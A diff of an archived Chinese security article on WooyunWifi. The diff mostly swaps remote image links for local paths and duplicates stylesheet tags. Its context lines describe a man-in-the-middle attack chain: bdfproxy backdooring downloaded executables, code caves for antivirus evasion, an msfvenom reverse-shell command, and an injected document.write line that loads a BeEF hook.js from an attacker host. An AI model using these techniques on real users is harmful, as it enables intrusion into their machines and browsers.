@@ -3,7 +3,7 @@
 			<head>
 			     <title>WooyunWifi高级组合技&一套连击拿SHELL - lxj616</title>
 				 <meta http-equiv="content-type" content="text/html; charset=UTF-8">
-			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
+			<link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style><link rel="stylesheet" type="text/css" href="../stylesheets/stylesheet.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/github-dark.css" media="screen"><link rel="stylesheet" type="text/css" href="../stylesheets/print.css" media="print"><style type="text/css">body {width: 90%;max-width: 960px;display: block;margin: 0 auto;}img {max-width: 900px;}</style></head>
 			<body>
 				<h1>原文地址:<a href="http://drops.wooyun.org/tips/7865">http://drops.wooyun.org/tips/7865</a></h1>
 				
@@ -46,7 +46,7 @@
 
 <p>在WooyunWifi的WEB界面中点击Settings（高级设置）按钮，在Traffic Redirect选项中填写流量转发的目标设备IP以及用于安全测试设备的IP，例：</p>
 
-<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/WooyunWificonfig.png"><img src="http://static.wooyun.org//drops/20150811/2015081103412148247.png" alt="" title="WooyunWificonfig" class="alignnone size-full wp-image-7866"></a></p>
+<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/WooyunWificonfig.png"><img src="../images_result/images/2015081103412148247.png" alt="" title="WooyunWificonfig" class="alignnone size-full wp-image-7866"></a></p>
 
 <p>192.168.1.134 是目标设备的IP，该IP的流量将被转发至Proxy IP</p>
 
@@ -180,7 +180,7 @@ continue execution.
 
 <p>在目标设备通过HTTP下载文件时，您将在bdfproxy中看到拦截下的请求，提示您选择注入的CAVE，这里上面我选择了2，输入2然后回车，目标设备这时成功下载到putty.exe，看上去毫无异样。</p>
 
-<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/normalvideo.png"><img src="http://static.wooyun.org//drops/20150811/2015081103412187770.png" alt="" title="normalvideo" class="alignnone size-full wp-image-7867"></a></p>
+<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/normalvideo.png"><img src="../images_result/images/2015081103412187770.png" alt="" title="normalvideo" class="alignnone size-full wp-image-7867"></a></p>
 
 <p>以上截图出自WooyunWifi 2.0的视频，目前版本已经到达3.0，除了功能增强也有一个全新界面了</p>
 
@@ -236,11 +236,11 @@ msfvenom –p windows/shell_reverse_tcp –x psexec.exe –k … 这是分配并
 
 <p>覆盖掉程序入口点之前：</p>
 
-<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/before_overwrite.png"><img src="http://static.wooyun.org//drops/20150811/2015081103412210861.png" alt="" title="before_overwrite" class="alignnone size-full wp-image-7868"></a></p>
+<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/before_overwrite.png"><img src="../images_result/images/2015081103412210861.png" alt="" title="before_overwrite" class="alignnone size-full wp-image-7868"></a></p>
 
 <p>覆盖掉程序入口点之后：</p>
 
-<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/after.png"><img src="http://static.wooyun.org//drops/20150811/2015081103412273230.png" alt="" title="after" class="alignnone size-full wp-image-7869"></a></p>
+<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/after.png"><img src="../images_result/images/2015081103412273230.png" alt="" title="after" class="alignnone size-full wp-image-7869"></a></p>
 
 <p>覆盖程序入口点方式的好处和弊端：</p>
 
@@ -251,11 +251,11 @@ msfvenom –p windows/shell_reverse_tcp –x psexec.exe –k … 这是分配并
 
 <p>创建新线程但是保留程序入口点方法：</p>
 
-<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/after_keep.png"><img src="http://static.wooyun.org//drops/20150811/2015081103412269855.png" alt="" title="after_keep" class="alignnone size-full wp-image-7870"></a></p>
+<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/after_keep.png"><img src="../images_result/images/2015081103412269855.png" alt="" title="after_keep" class="alignnone size-full wp-image-7870"></a></p>
 
 <p>可以明显地看到新增了一个RWE的code section</p>
 
-<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/before_keep.png"><img src="http://static.wooyun.org//drops/20150811/2015081103412223484.png" alt="" title="before_keep" class="alignnone size-full wp-image-7871"></a></p>
+<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/before_keep.png"><img src="../images_result/images/2015081103412223484.png" alt="" title="before_keep" class="alignnone size-full wp-image-7871"></a></p>
 
 <p>创建新线程但是保留程序入口点方法的好处和弊端：</p>
 
@@ -268,13 +268,13 @@ msfvenom –p windows/shell_reverse_tcp –x psexec.exe –k … 这是分配并
 
 <p>添加一个新的code section，这和保留程序入口点的msfvenom Keep方式相似，然后使用存在的code Caves来加解密新加的code section中的SHELLCODE（我们尝试过xor加密，但是已经对杀毒软件没啥用了）</p>
 
-<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/ctp.png"><img src="http://static.wooyun.org//drops/20150811/2015081103412282155.png" alt="" title="ctp" class="alignnone size-full wp-image-7872"></a></p>
+<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/ctp.png"><img src="../images_result/images/2015081103412282155.png" alt="" title="ctp" class="alignnone size-full wp-image-7872"></a></p>
 
 <p>译者注：上图与keep方式比较相似，先跳到新加的code section然后跳回原来的程序入口点</p>
 
 <p>那么，什么是Code Caves 呢？</p>
 
-<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/cc1.png"><img src="http://static.wooyun.org//drops/20150811/2015081103412293977.png" alt="" title="cc1" class="alignnone size-full wp-image-7873"></a></p>
+<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/cc1.png"><img src="../images_result/images/2015081103412293977.png" alt="" title="cc1" class="alignnone size-full wp-image-7873"></a></p>
 
 <p>Code Cave 是指在一个二进制文件中存在的一个全都是空字节（x00）的区域</p>
 
@@ -326,21 +326,21 @@ Lcc-win32: 0
 
 <p>MSFVENOM –k –t exe</p>
 
-<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/vs001.png"><img src="http://static.wooyun.org//drops/20150811/2015081103412215141.png" alt="" title="vs001" class="alignnone size-full wp-image-7874"></a></p>
+<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/vs001.png"><img src="../images_result/images/2015081103412215141.png" alt="" title="vs001" class="alignnone size-full wp-image-7874"></a></p>
 
 <p>MSFVENOM –t exe</p>
 
-<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/vs002.png"><img src="http://static.wooyun.org//drops/20150811/2015081103412355213.png" alt="" title="vs002" class="alignnone size-full wp-image-7875"></a></p>
+<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/vs002.png"><img src="../images_result/images/2015081103412355213.png" alt="" title="vs002" class="alignnone size-full wp-image-7875"></a></p>
 
 <p>BDF Cave jumping</p>
 
-<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/vs003.png"><img src="http://static.wooyun.org//drops/20150811/2015081103412315115.png" alt="" title="vs003" class="alignnone size-full wp-image-7876"></a></p>
+<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/vs003.png"><img src="../images_result/images/2015081103412315115.png" alt="" title="vs003" class="alignnone size-full wp-image-7876"></a></p>
 
 <p>然后对比一下32位挂后门和64位挂后门的效果：</p>
 
-<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/vs004.png"><img src="http://static.wooyun.org//drops/20150811/2015081103412394651.png" alt="" title="vs004" class="alignnone size-full wp-image-7877"></a></p>
+<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/vs004.png"><img src="../images_result/images/2015081103412394651.png" alt="" title="vs004" class="alignnone size-full wp-image-7877"></a></p>
 
-<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/vs005.png"><img src="http://static.wooyun.org//drops/20150811/2015081103412368243.png" alt="" title="vs005" class="alignnone size-full wp-image-7878"></a></p>
+<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/vs005.png"><img src="../images_result/images/2015081103412368243.png" alt="" title="vs005" class="alignnone size-full wp-image-7878"></a></p>
 
 <p>因此，BDF在自动化挂后门流程的同时，也实现了CTP方式挂后门的功能，这也就是之前手动选择Code Cave的原因，根据测试结果看来，Cave跳转方式过杀软的效果最好，而64位后门比32位后门的隐蔽性更高</p>
 
@@ -355,7 +355,7 @@ Lcc-win32: 0
 <pre><code>document.write("&lt;script language='javascript' src='http://192.168.1.163:3000/hook.js'&gt;&lt;/script&gt;");
 </code></pre>
 
-<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/beefconfig.png"><img src="http://static.wooyun.org//drops/20150811/2015081103412369617.png" alt="" title="beefconfig" class="alignnone size-full wp-image-7879"></a></p>
+<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/beefconfig.png"><img src="../images_result/images/2015081103412369617.png" alt="" title="beefconfig" class="alignnone size-full wp-image-7879"></a></p>
 
 <p>我们注入的是JS语句，请不要混淆“JS语句”、“HTML标签”和“JS文件”的区别，在beEF中会自动生成hook.js并提示其URL地址，我们要想让beEF成功hook到目标浏览器，就要在目标浏览器上对应页面执行hook.js，因此我们使用JS语法document.write写入一个html标签，然后由标签来在当前页面加载hook.js（js执行的页面对beEF有重大影响，建议以这种方式在当前页面进行hook，您也可以尝试其他方式）</p>
 
@@ -363,7 +363,7 @@ Lcc-win32: 0
 
 <p>hook成功后，将在beef“Hooked Browsers”里面弹出上线的浏览器，在这里可以看到详细的浏览器信息</p>
 
-<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/beefpanel.png"><img src="http://static.wooyun.org//drops/20150811/2015081103412380701.png" alt="" title="beefpanel" class="alignnone size-full wp-image-7880"></a></p>
+<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/beefpanel.png"><img src="../images_result/images/2015081103412380701.png" alt="" title="beefpanel" class="alignnone size-full wp-image-7880"></a></p>
 
 <p>如图，目标浏览器为IE 9，并且支持Flash，使用老版本IE还开着Flash这基本上就是随意拿SHELL的了</p>
 
@@ -474,11 +474,11 @@ msf exploit(ie_unsafe_scripting) &gt;
 
 <p>然后在beEF里面让目标浏览器跳转至你的Browser Exploit的uri中，如图：</p>
 
-<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/2222.png"><img src="http://static.wooyun.org//drops/20150811/2015081103412480714.png" alt="" title="2222" class="alignnone size-full wp-image-7881"></a></p>
+<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/2222.png"><img src="../images_result/images/2015081103412480714.png" alt="" title="2222" class="alignnone size-full wp-image-7881"></a></p>
 
 <p>之后目标浏览器就会访问我们设置好的Metasploit Browser Exploit页面，触发漏洞：</p>
 
-<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/hellomsf.png"><img src="http://static.wooyun.org//drops/20150811/2015081103412439194.png" alt="" title="hellomsf" class="alignnone size-full wp-image-7882"></a></p>
+<p><a href="http://drops.wooyun.org/wp-content/uploads/2015/08/hellomsf.png"><img src="../images_result/images/2015081103412439194.png" alt="" title="hellomsf" class="alignnone size-full wp-image-7882"></a></p>
 
 <h1>0x05 Browser Exploit组合原理科普</h1>
 
